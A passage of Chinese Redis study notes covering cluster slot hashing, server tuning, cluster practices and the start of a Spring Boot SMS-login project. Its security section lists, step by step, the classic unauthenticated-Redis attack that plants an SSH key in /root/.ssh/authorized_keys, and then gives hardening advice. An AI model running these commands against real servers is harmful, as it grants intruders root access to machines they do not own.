   private static final int[] LOOKUP_TABLE = { 0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50A5, 0x60C6, 0x70E7, 0x8108,
         0x9129, 0xA14A, 0xB16B, 0xC18C, 0xD1AD, 0xE1CE, 0xF1EF, 0x1231, 0x0210, 0x3273, 0x2252, 0x52B5, 0x4294, 0x72F7,
         0x62D6, 0x9339, 0x8318, 0xB37B, 0xA35A, 0xD3BD, 0xC39C, 0xF3FF, 0xE3DE, 0x2462, 0x3443, 0x0420, 0x1401, 0x64E6,
         0x74C7, 0x44A4, 0x5485, 0xA56A, 0xB54B, 0x8528, 0x9509, 0xE5EE, 0xF5CF, 0xC5AC, 0xD58D, 0x3653, 0x2672, 0x1611,
         0x0630, 0x76D7, 0x66F6, 0x5695, 0x46B4, 0xB75B, 0xA77A, 0x9719, 0x8738, 0xF7DF, 0xE7FE, 0xD79D, 0xC7BC, 0x48C4,
         0x58E5, 0x6886, 0x78A7, 0x0840, 0x1861, 0x2802, 0x3823, 0xC9CC, 0xD9ED, 0xE98E, 0xF9AF, 0x8948, 0x9969, 0xA90A,
         0xB92B, 0x5AF5, 0x4AD4, 0x7AB7, 0x6A96, 0x1A71, 0x0A50, 0x3A33, 0x2A12, 0xDBFD, 0xCBDC, 0xFBBF, 0xEB9E, 0x9B79,
         0x8B58, 0xBB3B, 0xAB1A, 0x6CA6, 0x7C87, 0x4CE4, 0x5CC5, 0x2C22, 0x3C03, 0x0C60, 0x1C41, 0xEDAE, 0xFD8F, 0xCDEC,
         0xDDCD, 0xAD2A, 0xBD0B, 0x8D68, 0x9D49, 0x7E97, 0x6EB6, 0x5ED5, 0x4EF4, 0x3E13, 0x2E32, 0x1E51, 0x0E70, 0xFF9F,
         0xEFBE, 0xDFDD, 0xCFFC, 0xBF1B, 0xAF3A, 0x9F59, 0x8F78, 0x9188, 0x81A9, 0xB1CA, 0xA1EB, 0xD10C, 0xC12D, 0xF14E,
         0xE16F, 0x1080, 0x00A1, 0x30C2, 0x20E3, 0x5004, 0x4025, 0x7046, 0x6067, 0x83B9, 0x9398, 0xA3FB, 0xB3DA, 0xC33D,
         0xD31C, 0xE37F, 0xF35E, 0x02B1, 0x1290, 0x22F3, 0x32D2, 0x4235, 0x5214, 0x6277, 0x7256, 0xB5EA, 0xA5CB, 0x95A8,
         0x8589, 0xF56E, 0xE54F, 0xD52C, 0xC50D, 0x34E2, 0x24C3, 0x14A0, 0x0481, 0x7466, 0x6447, 0x5424, 0x4405, 0xA7DB,
         0xB7FA, 0x8799, 0x97B8, 0xE75F, 0xF77E, 0xC71D, 0xD73C, 0x26D3, 0x36F2, 0x0691, 0x16B0, 0x6657, 0x7676, 0x4615,
         0x5634, 0xD94C, 0xC96D, 0xF90E, 0xE92F, 0x99C8, 0x89E9, 0xB98A, 0xA9AB, 0x5844, 0x4865, 0x7806, 0x6827, 0x18C0,
         0x08E1, 0x3882, 0x28A3, 0xCB7D, 0xDB5C, 0xEB3F, 0xFB1E, 0x8BF9, 0x9BD8, 0xABBB, 0xBB9A, 0x4A75, 0x5A54, 0x6A37,
         0x7A16, 0x0AF1, 0x1AD0, 0x2AB3, 0x3A92, 0xFD2E, 0xED0F, 0xDD6C, 0xCD4D, 0xBDAA, 0xAD8B, 0x9DE8, 0x8DC9, 0x7C26,
         0x6C07, 0x5C64, 0x4C45, 0x3CA2, 0x2C83, 0x1CE0, 0x0CC1, 0xEF1F, 0xFF3E, 0xCF5D, 0xDF7C, 0xAF9B, 0xBFBA, 0x8FD9,
         0x9FF8, 0x6E17, 0x7E36, 0x4E55, 0x5E74, 0x2E93, 0x3EB2, 0x0ED1, 0x1EF0 };

   private ClusterSlotHashUtil() {}

   public static int calculateSlot(String key) {

      Assert.hasText(key, "Key must not be null or empty!");
      return calculateSlot(key.getBytes());
   }

   public static int calculateSlot(byte[] key) {

      Assert.notNull(key, "Key must not be null!");

      byte[] finalKey = key;
      int start = indexOf(key, SUBKEY_START);
      if (start != -1) {
         int end = indexOf(key, start + 1, SUBKEY_END);
         if (end != -1 && end != start + 1) {

            finalKey = new byte[end - (start + 1)];
            System.arraycopy(key, start + 1, finalKey, 0, finalKey.length);
         }
      }
      return crc16(finalKey) % SLOT_COUNT;
   }

   private static int indexOf(byte[] haystack, byte needle) {
      return indexOf(haystack, 0, needle);
   }

   private static int indexOf(byte[] haystack, int start, byte needle) {

      for (int i = start; i < haystack.length; i++) {

         if (haystack[i] == needle) {
            return i;
         }
      }

      return -1;
   }

   private static int crc16(byte[] bytes) {

      int crc = 0x0000;

      for (byte b : bytes) {
         crc = ((crc << 8) ^ LOOKUP_TABLE[((crc >>> 8) ^ (b & 0xFF)) & 0xFF]);
      }
      return crc & 0xFFFF;
   }

}
```

`Assert`类的定义如下：

```java
package com.example.redis.jedis.util;

public class Assert {
    public static void notNull(Object obj, String msg){
        if (obj == null) {
            throw new RuntimeException(msg);
        }
    }
    public static void hasText(String str, String msg){
        if (str == null) {
            throw new RuntimeException(msg);
        }
        if (str.trim().isEmpty()) {
            throw new RuntimeException(msg);
        }
    }
}
```

下面是SpringBoot中的实现（基于lettuce）：

```java
package com.example.redis.spring;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

// 类：SpringDataRedisTest

@Autowired
private StringRedisTemplate stringRedisTemplate;

@Test
void testMSetInCluster() {
    Map<String, String> map = new HashMap<>(3);
    map.put("name", "Rose");
    map.put("age", "21");
    map.put("sex", "Female");
    stringRedisTemplate.opsForValue().multiSet(map);
    List<String> strings = stringRedisTemplate.opsForValue().multiGet(Arrays.asList("name", "age", "sex"));
    strings.forEach(System.out::println);
}
```

集群配置如下（文件src/main/resources/application.yml）：

```yml
spring:
  redis:
    # host: 192.168.150.101
    # port: 6379
    # password: 123321
    lettuce:
      pool:
        max-active: 8
        max-idle: 8
        min-idle: 0
        max-wait: 100ms
   cluster:
     nodes:
       - 192.168.150.101:7001
       - 192.168.150.101:7002
       - 192.168.150.101:7003
       - 192.168.150.101:8001
       - 192.168.150.101:8002
       - 192.168.150.101:8003
```

这里成功执行。lettuce执行集群模式下的`mset`采用的是异步slot方案。

## 服务端优化

### 持久化配置

Redis的持久化虽然可以保证数据安全，但也会带来很多额外的开销，因此持久化请遵循下列建议：

- 用来做缓存的Redis实例尽量不要开启持久化功能。
- 建议关闭RDB持久化功能，使用AOF持久化（RDB数据安全性低，因为频率低，如果将其频率调高，则影响性能；RDB最好用于定期手动备份）。
- 利用脚本定期在从节点做RDB，实现数据备份。
- 设置合理的rewrite阈值，避免频繁的bgrewrite。
- 配置`no-appendfsync-on-rewrite = yes`，禁止在rewrite期间做AOF，避免因AOF引起的阻塞（但是这会降低数据安全性，因此需要权衡）。主线程接收到写命令时，会将命令写到AOF缓冲区；一个同步线程每隔1秒会将数据同步到磁盘；主线程会对比上次fsync时间，如果该时间小于2秒，则通过，否则阻塞，直到同步线程刷盘结束。因此rewrite期间做AOF容易导致AOF阻塞，从而导致主线程阻塞。

[^0]: 配置`no-appendfsync-on-rewrite = yes`的原因描述。

部署有关建议：

- Redis实例的物理机要预留足够内存，应对fork和rewrite。
- 单个Redis实例内存上限不要太大，例如4G或8G。可以加快fork的速度、减少主从同步、数据迁移压力。如果物理机内存很大，建议单机多实例。
- 不要与CPU密集型应用部署在一起。
- 不要与高硬盘负载应用一起部署。例如：数据库、消息队列。

### 慢查询

在Redis执行时耗时超过某个阈值的命令，称为慢查询。

客户端发送命令会进入Redis服务端的队列，服务端依次执行。如果正在执行的命令是慢查询，则在队列中的命令可能因为等待超时报错。因此慢查询会导致Redis主线程阻塞，影响性能，甚至引起故障。

慢查询的阈值可以通过配置指定：

- `slowlog-log-slower-than`：慢查询阈值，单位是微秒。默认是10000，建议1000。

慢查询会被放入慢查询日志中，日志的长度有上限，可以通过配置指定：

- `slowlog-max-len`：慢查询日志（本质是一个队列）的长度。默认是128，建议1000。

  ```sh
  config get slowlog-max-len
  config get slowlog-log-slower-than
  ```

修改这两个配置可以使用`config set`命令：

```sh
# 重启后失效，在配置文件中配置以持久化
config set slowlog-max-len 1000
config set slowlog-log-slower-than 1000
```

查看慢查询日志列表：

- `slowlog len`：查询慢查询日志长度。
- `slowlog get [n]`：读取$n$条慢查询日志（返回慢查询的日志编号、时间戳、耗时、命令、发起的客户端IP、端口与名称）。
- `slowlog reset`：清空慢查询列表。

### 命令及安全配置

Redis会绑定在0.0.0.0:6379，这样将会将Redis服务暴露到公网上，而Redis如果没有做身份认证，会出现严重的安全漏洞。

漏洞重现方式如下[^3]：

```sh
ssh-keygen –t rsa  # 本地生产公私钥文件
(echo -e "  "; cat id_rsa.pub; echo -e "  ") > foo.txt  # 将公钥写入某个文件，例如foo.txt
cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit  # 连接Redis，设置键，例如crackit为foo.txt文件中的内容
redis-cli -h 192.168.1.11  # 连接Redis
config set dir /root/.ssh/  # 修改持久化文件保存目录
config set dbfilename "authorized_keys"  # 指定RDB文件名称，一旦Redis持久化，就会将公钥写到该文件中，从而可以免密钥登录
save  # RDB持久化
ssh –i  id_rsa root@192.168.1.11  # 远程利用自己的私钥登录该服务器（免密登录）
```

漏洞出现的核心的原因有以下几点：

- 用户可以直接连接到Redis服务器，例如Redis绑定的端口号为6379（人人皆知）、Redis未设置密码。
- 利用了Redis的`config set`命令动态修改Redis配置。
- Redis具备写入root目录的权限：使用了Root账号权限启动Redis。

为了避免这样的漏洞，这里给出一些建议：

- Redis一定要设置密码。
- 禁止线上使用下面命令：`keys`、`flushall`、`flushdb`、`config set`等命令。可以利用`rename-command`禁用（置为`""`或复杂的字符串）。
- bind：限制网卡，禁止外网网卡访问。
- 开启防火墙。
- 不要使用Root账户启动Redis。
- 尽量不要用默认的端口6379。

### 内存配置

当Redis内存不足时，可能导致键频繁被删除、响应时间变长、QPS不稳定等问题。当内存使用率达到90%以上时就需要我们警惕，并快速定位到内存占用的原因。

| 内存占用   | 说明                                                         |
| ---------- | ------------------------------------------------------------ |
| 数据内存   | 是Redis最主要的部分，存储Redis的键值信息。主要问题是BigKey问题、内存碎片问题（可以通过定期重启Redis服务器回收内存碎片，可以按照主从或集群分批重启以确保Redis可用） |
| 进程内存   | Redis主进程本身运行肯定需要占用内存，如代码、常量池等等；这部分内存大约几兆，在大多数生产环境中与Redis数据占用的内存相比可以忽略 |
| 缓冲区内存 | 一般包括客户端缓冲区、AOF缓冲区、复制缓冲区等。客户端缓冲区又包括输入缓冲区和输出缓冲区两种。这部分内存占用波动较大，不当使用BigKey，可能导致内存溢出 |

Redis提供了一些命令，可以查看到Redis目前的内存分配状态：

- `info memory`：查看内存相关信息。
- `memory xxx`：查看具体内存信息（例如`memory stats`统计内存相关信息）。

常见的内存缓冲区有三种：

- 复制缓冲区：主从复制的`repl_backlog_buf`，如果太小可能导致频繁的全量复制，影响性能。通过`repl-backlog-size`来设置，默认1MB。

- AOF缓冲区：AOF刷盘之前的缓存区域，AOF执行rewrite的缓冲区。无法设置容量上限。

- 客户端缓冲区：分为输入缓冲区和输出缓冲区，输入缓冲区最大1G且不能设置。输出缓冲区可以设置：

  ```sh
  client-output-buffer-limit <class> <hard limit> <soft limit> <soft seconds>
  ```

  其中：

  - `<class>`代表客户端类型，包括：
    - `normal`：普通客户端。
    - `replica`：主从复制客户端。
    - `pubsub`：PubSub客户端。
  - `<hard limit>`：缓冲区上限在超过`limit`后断开客户端。
  - `<soft limit> <soft seconds>`：缓冲区上限，在超过`soft limit`并且持续了`soft seconds`秒后断开客户端。

  默认配置如下：

  ```sh
  client-output-buffer-limit normal 0 0 0  # 没有上限
  client-output-buffer-limit replica 256mb 64 mb 60
  client-output-buffer-limit pubsub 32mb 8mb 60
  ```
  
  通过以下命令可以查看客户端信息：
  
  ```sh
  info clients  # 客户端信息
  client list  # 当前连接到Redis的所有客户端的详细信息
  ```

## 集群最佳实践

集群虽然具备高可用特性，能实现自动故障恢复，但是如果使用不当，也会存在一些问题：

- 集群完整性问题：在Redis的默认配置中，如果发现任意一个插槽不可用（例如某个完整的主从集群宕机导致其插槽不可用），则整个集群都会停止对外服务，即`cluster-require-full-coverage`默认值为`yes`。为了保证高可用特性，这里建议将`cluster-require-full-coverage`配置为`no`（此时如果插槽值在不可用的节点上仍然不可用），牺牲一定的数据完整性而提高可用性。
- 集群带宽问题：集群节点之间会不断的互相ping来确定集群中其它节点的状态。每次ping携带的信息至少包括插槽信息与集群状态信息。集群中节点越多，集群状态信息数据量也越大，10个节点的相关信息可能达到1KB，此时每次集群互通需要的带宽会非常高。解决途径：
  - 避免大集群，集群节点数不要太多，最好少于1000；如果业务庞大，则建立多个集群。
  - 避免在单个物理机中运行太多Redis实例。
  - 配置合适的`cluster-node-timeout`值（集群节点客观下线的默认时间：距离上一次ping超过该时间，则认为节点下线；ping的频率为该时间的一半）。太大会降低集群可用性，太小会占用过多带宽。
- 数据倾斜问题（例如使用BigKey或批处理使用相同的hash tag）。
- 客户端性能问题（客户端访问集群需要进行节点的选择、读写分离的判断、插槽的判断等）。
- 命令的集群兼容性问题（例如`mset`、`pipeline`等批处理命令在集群模式下无法正常运行，客户端处理带来额外负担且会降低性能）。
- lua和事务问题（多个命令对应的键插槽可能不在同一节点，因此在集群模式下无法运行lua与事务）。

单体Redis（主从Redis）已经能达到万级别的QPS，并且也具备很强的高可用特性。如果主从能满足业务需求的情况下，尽量不搭建Redis集群。

# Redis企业实战

下面结合Redis实现一个项目，包括以下功能：

- 短信登录
- 商户查询缓存
- 优惠券秒杀
- 达人探店
- 好友关注
- 附近的商户
- 用户签到
- UV统计

创建SpringBoot项目，pom.xml如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.3.12.RELEASE</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.hmdp</groupId>
    <artifactId>hm-dianping</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>hm-dianping</name>
    <description>Demo project for Spring Boot</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-redis</artifactId>
        </dependency>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-pool2</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <scope>runtime</scope>
            <version>5.1.47</version>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <optional>true</optional>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>com.baomidou</groupId>
            <artifactId>mybatis-plus-boot-starter</artifactId>
            <version>3.4.3</version>
        </dependency>
        <!--hutool-->
        <dependency>
            <groupId>cn.hutool</groupId>
            <artifactId>hutool-all</artifactId>
            <version>5.7.17</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <configuration>
                    <excludes>
                        <exclude>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok</artifactId>
                        </exclude>
                    </excludes>
                </configuration>
            </plugin>
        </plugins>
    </build>

</project>
```

在MySQL（5.7及以上版本）中创建数据库hmdp，导入[hmdp.sql](资源\hmdp.sql)。

解压[nginx-1.18.0.zip](资源\nginx-1.18.0.zip)到任意目录（确保该目录不包含中文、特殊字符与空格）。进入解压后的目录，打开CMD窗口，输入命令：`start nginx.exe`。打开浏览器，并打开手机模式，然后访问http://127.0.0.1:8080，即可看到页面。

在src/main/resources目录下，创建配置文件application.yml：

```yml
server:
  port: 8081
spring:
  application:
    name: hmdp
  datasource:
    driver-class-name: com.mysql.jdbc.Driver
    url: jdbc:mysql://127.0.0.1:3306/hmdp?useSSL=false&serverTimezone=UTC
    username: root
    password: root
  redis:
    host: 192.168.242.143
    port: 6379
    password: 123456
    lettuce:
      pool:
        max-active: 10
        max-idle: 10
        min-idle: 1
        time-between-eviction-runs: 10s
  jackson:
    default-property-inclusion: non_null  # JSON处理时忽略非空字段
mybatis-plus:
  type-aliases-package: com.hmdp.entity  # 别名扫描包
logging:
  level:
    com.hmdp: debug
```

启动类：

```java
package com.hmdp;

import org.mybatis.spring.annotation.MapperScan;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@MapperScan("com.hmdp.mapper")
@SpringBootApplication
public class HmDianPingApplication {

    public static void main(String[] args) {
        SpringApplication.run(HmDianPingApplication.class, args);
    }

}
```

配置Mybatis：

```java
package com.hmdp.config;

import com.baomidou.mybatisplus.annotation.DbType;
import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;
import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MybatisConfig {
    @Bean
    public MybatisPlusInterceptor mybatisPlusInterceptor() {
        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();
        interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));
        return interceptor;
    }
}
```

配置异常处理器：

```java
package com.hmdp.config;

import com.hmdp.dto.Result;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.bind.annotation.RestControllerAdvice;

@Slf4j
@RestControllerAdvice
public class WebExceptionAdvice {

    @ExceptionHandler(RuntimeException.class)
    public Result handleRuntimeException(RuntimeException e) {
        log.error(e.toString(), e);
        return Result.fail("服务器异常");
    }
}
```

## 短信登录

### 基于Session实现登录

#### 发送短信验证码

创建`UserController`类，实现发送手机验证码功能：

```java
package com.hmdp.controller;

import com.hmdp.dto.Result;
import com.hmdp.service.IUserService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import javax.servlet.http.HttpSession;

@Slf4j
@RestController
@RequestMapping("/user")
public class UserController {

    @Resource
    private IUserService userService;

    /**
     * 发送手机验证码
     */
    @PostMapping("code")
    public Result sendCode(@RequestParam("phone") String phone, HttpSession session) {
        // 发送短信验证码并保存验证码
        return userService.sendCode(phone, session);
    }
}
```

其中，`Result`类是一个通用的结果对象：

```java
package com.hmdp.dto;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

import java.util.List;

@Data
@NoArgsConstructor
@AllArgsConstructor
public class Result {

    private Boolean success;

    private String errorMsg;
    
    private Object data;

    private Long total;

    public static Result ok() {
        return new Result(true, null, null, null);
    }

    public static Result ok(Object data) {
        return new Result(true, null, data, null);
    }

    public static Result ok(List<?> data, Long total) {
        return new Result(true, null, data, total);
    }

    public static Result fail(String errorMsg) {
        return new Result(false, errorMsg, null, null);
    }

}
```

对应的`IUserService`：

```java
package com.hmdp.service;

import com.baomidou.mybatisplus.extension.service.IService;
import com.hmdp.dto.Result;
import com.hmdp.entity.User;

import javax.servlet.http.HttpSession;


public interface IUserService extends IService<User> {

    Result sendCode(String phone, HttpSession session);

}
```

```java
package com.hmdp.service.impl;

import cn.hutool.core.util.RandomUtil;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.hmdp.dto.Result;
import com.hmdp.entity.User;
import com.hmdp.mapper.UserMapper;
import com.hmdp.service.IUserService;
import com.hmdp.utils.RegexUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import javax.servlet.http.HttpSession;

@Slf4j
@Service
public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements IUserService {

    @Override
    public Result sendCode(String phone, HttpSession session) {
        // 校验手机号
        if (RegexUtils.isPhoneInvalid(phone)) {
            // 如果不符合，返回错误信息
            return Result.fail("手机号格式错误！");
        }
        // 符合，生成验证码
        String code = RandomUtil.randomNumbers(6);
        // 保存验证码到session
        session.setAttribute("code", code);  // 字符串常量最好定义为常量值，而不是使用魔法值
        // 发送验证码
        log.debug("发送短信验证码成功，验证码：{}", code);
        // 返回ok
        return Result.ok();
    }
    
}
```

其中，`User`的定义如下：

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDateTime;

@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_user")
public class User implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 主键
     */
    @TableId(value = "id", type = IdType.AUTO)
    private Long id;

    /**
     * 手机号码
     */
    private String phone;

    /**
     * 密码，加密存储
     */
    private String password;

    /**
     * 昵称，默认是随机字符
     */
    private String nickName;

    /**
     * 用户头像
     */
    private String icon = "";

    /**
     * 创建时间
     */
    private LocalDateTime createTime;

    /**
     * 更新时间
     */
    private LocalDateTime updateTime;


}
```

`UserMapper`的定义如下：

```java
package com.hmdp.mapper;

import com.hmdp.entity.User;
import com.baomidou.mybatisplus.core.mapper.BaseMapper;

public interface UserMapper extends BaseMapper<User> {}
```

`RegexUtils`提供了一系列校验方法：

```java
package com.hmdp.utils;

import cn.hutool.core.util.StrUtil;

public class RegexUtils {
    /**
     * 是否是无效手机格式
     * @param phone 要校验的手机号
     * @return true:符合，false：不符合
     */
    public static boolean isPhoneInvalid(String phone) {
        return mismatch(phone, RegexPatterns.PHONE_REGEX);
    }
    /**
     * 是否是无效邮箱格式
     * @param email 要校验的邮箱
     * @return true:符合，false：不符合
     */
    public static boolean isEmailInvalid(String email) {
        return mismatch(email, RegexPatterns.EMAIL_REGEX);
    }

    /**
     * 是否是无效验证码格式
     * @param code 要校验的验证码
     * @return true:符合，false：不符合
     */
    public static boolean isCodeInvalid(String code) {
        return mismatch(code, RegexPatterns.VERIFY_CODE_REGEX);
    }

    // 校验是否不符合正则格式
    private static boolean mismatch(String str, String regex) {
        if (StrUtil.isBlank(str)) {
            return true;
        }
        return !str.matches(regex);
    }
    
}
```

`RegexPatterns`提供了一系列正则表达式：

```java
package com.hmdp.utils;

public abstract class RegexPatterns {
    /**
     * 手机号正则
     */
    public static final String PHONE_REGEX = "^1([38][0-9]|4[579]|5[0-3,5-9]|6[6]|7[0135678]|9[89])\\d{8}$";
    /**
     * 邮箱正则
     */
    public static final String EMAIL_REGEX = "^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+$";
    /**
     * 密码正则。4~32位的字母、数字、下划线
     */
    public static final String PASSWORD_REGEX = "^\\w{4,32}$";
    /**
     * 验证码正则, 6位数字或字母
     */
    public static final String VERIFY_CODE_REGEX = "^[a-zA-Z\\d]{6}$";

}
```

#### 短信验证码登录

在`UserController`中添加方法：

```java
import com.hmdp.dto.LoginFormDTO;

/**
 * 登录功能
 * @param loginForm 登录参数，包含手机号、验证码；或者手机号、密码
 */
@PostMapping("/login")
public Result login(@RequestBody LoginFormDTO loginForm, HttpSession session) {
    // 实现登录功能
    return userService.login(loginForm, session);
}
```

`LoginFormDTO`的定义如下：

```java
package com.hmdp.dto;

import lombok.Data;

@Data
public class LoginFormDTO {
    
    private String phone;
    
    private String code;  // 支持验证码登录
    
    private String password;  // 支持密码登录
    
}
```

在`IUserService`中添加方法：

```java
import com.hmdp.dto.LoginFormDTO;

Result login(LoginFormDTO loginForm, HttpSession session);
```

对应的实现类：

```java
import com.hmdp.dto.LoginFormDTO;

@Override
public Result login(LoginFormDTO loginForm, HttpSession session) {
    // 校验手机号
    String phone = loginForm.getPhone();
    if (RegexUtils.isPhoneInvalid(phone)) {
        // 如果不符合，返回错误信息
        return Result.fail("手机号格式错误！");
    }
    // 从session获取验证码并校验（每个请求都要做独立的校验，不能依赖于sendCode方法的校验）
    Object cacheCode = session.getAttribute("code");
    String code = loginForm.getCode();
    if (cacheCode == null || !cacheCode.toString().equals(code)) {
        // 不一致，报错
        return Result.fail("验证码错误");
    }
    // 一致，根据手机号查询用户
    User user = query().eq("phone", phone).one();
    // 判断用户是否存在
    if (user == null) {
        // 不存在，创建新用户并保存
        user = createUserWithPhone(phone);
    }
    // 保存用户信息到session中
    session.setAttribute("user", user);
    return Result.ok();  // 基于session实现，不需要返回登录凭证
}
```

其中，`createUserWithPhone`方法用于创建并保存用户。

```java
import static com.hmdp.utils.SystemConstants.USER_NICK_NAME_PREFIX;

private User createUserWithPhone(String phone) {
    // 创建用户
    User user = new User();
    user.setPhone(phone);
    user.setNickName(USER_NICK_NAME_PREFIX + RandomUtil.randomString(10));
    // 保存用户
    save(user);
    return user;
}
```

类`SystemConstants`提供了一组如下的常量：

```java
package com.hmdp.utils;

public class SystemConstants {

    public static final String IMAGE_UPLOAD_DIR = "...";

    public static final String USER_NICK_NAME_PREFIX = "user_";

    public static final int DEFAULT_PAGE_SIZE = 5;

    public static final int MAX_PAGE_SIZE = 10;

}
```

#### 登录验证功能

用户请求并携带cookie，服务端根据cookie的JSESSIONID得到session，从session中获取用户信息。如果用户存在，则返回用户，否则拦截用户。

为了保证系统的可扩展性，登录验证流程可以由拦截器处理。拦截器拦截得到的用户信息需要传递给控制器，并使用`ThreadLocal`保证线程安全：

```java
package com.hmdp.utils;

import com.hmdp.entity.User;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

public class LoginInterceptor implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
        // 获取session
        HttpSession session = request.getSession();
        // 获取session中的用户
        Object user = session.getAttribute("user");
        // 判断用户是否存在
        if (user == null) {
            // 不存在，拦截
            // 拦截标识：返回401状态码（或者直接抛出异常）
            response.setStatus(401);
            return false;
        }
        // 存在，保存用户信息到ThreadLocal
        UserHolder.saveUser((User) user);
        // 放行
        return true;
    }

    // （可选方法）
    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) {
        // 移除用户
        UserHolder.removeUser();
    }

}
```

`UserHolder`提供了处理`User`类的`ThreadLocal`：

```java
package com.hmdp.utils;

import com.hmdp.entity.User;

public class UserHolder {

    private static final ThreadLocal<User> tl = new ThreadLocal<>();

    public static void saveUser(User user) {
        tl.set(user);
    }

    public static User getUser() {
        return tl.get();
    }

    public static void removeUser() {
        tl.remove();
    }

}
```

配置拦截器：

```java
package com.hmdp.config;

import com.hmdp.utils.LoginInterceptor;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class MvcConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new LoginInterceptor())
                .excludePathPatterns(
                        "/shop/**",
                        "/voucher/**",
                        "/shop-type/**",
                        "/upload/**",
                        "/blog/hot",
                        "/user/code",
                        "/user/login"
                );
    }

}
```

在`UserController`中添加方法，用于获取当前登录的用户并返回：

```java
import com.hmdp.entity.User;
import com.hmdp.utils.UserHolder;

@GetMapping("/me")
public Result me(){
    User user = UserHolder.getUser();
    return Result.ok(user);
}
```

#### 隐藏用户敏感信息

以上将`User`类存储到session中，该类包含一些用不到的信息，这会导致内存压力大、敏感信息泄露，下面将`User`转为`UserDTO`并保存到session。

创建`UserDTO`类：

```java
package com.hmdp.dto;

import lombok.Data;

@Data
public class UserDTO {
    
    private Long id;
    
    private String nickName;
    
    private String icon;
    
}
```

修改`UserServiceImpl`的`login`方法：

```java
import cn.hutool.core.bean.BeanUtil;
import com.hmdp.dto.UserDTO;

// 保存用户信息到session
// session.setAttribute("user", user); ->
session.setAttribute("user", BeanUtil.copyProperties(user, UserDTO.class));
```

修改`UserHolder`：

```java
package com.hmdp.utils;

import com.hmdp.dto.UserDTO;

public class UserHolder {

    private static final ThreadLocal<UserDTO> tl = new ThreadLocal<>();

    public static void saveUser(UserDTO user) {
        tl.set(user);
    }

    public static UserDTO getUser() {
        return tl.get();
    }

    public static void removeUser() {
        tl.remove();
    }

}
```

修改`LoginInterceptor`的`preHandle`方法：

```java
import com.hmdp.dto.UserDTO;

// 存在，保存用户信息到ThreadLocal
// UserHolder.saveUser((User) user); ->
UserHolder.saveUser((UserDTO) user);
```

修改`UserController`的`me`方法：

```java
import com.hmdp.dto.UserDTO;

@GetMapping("/me")
public Result me(){
    UserDTO user = UserHolder.getUser();
    return Result.ok(user);
}
```

#### 完善

最后，在`UserController`中添加一个方法，可以查询用户详情：

```java
import com.hmdp.entity.UserInfo;
import com.hmdp.service.IUserInfoService;

@Resource
private IUserInfoService userInfoService;

@GetMapping("/info/{id}")
public Result info(@PathVariable("id") Long userId){
    // 查询详情
    UserInfo info = userInfoService.getById(userId);
    if (info == null) {
        // 没有详情，应该是第一次查看详情
        return Result.ok();
    }
    info.setCreateTime(null);
    info.setUpdateTime(null);
    // 返回
    return Result.ok(info);
}
```

`UserInfo`类的定义如下：

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableId;
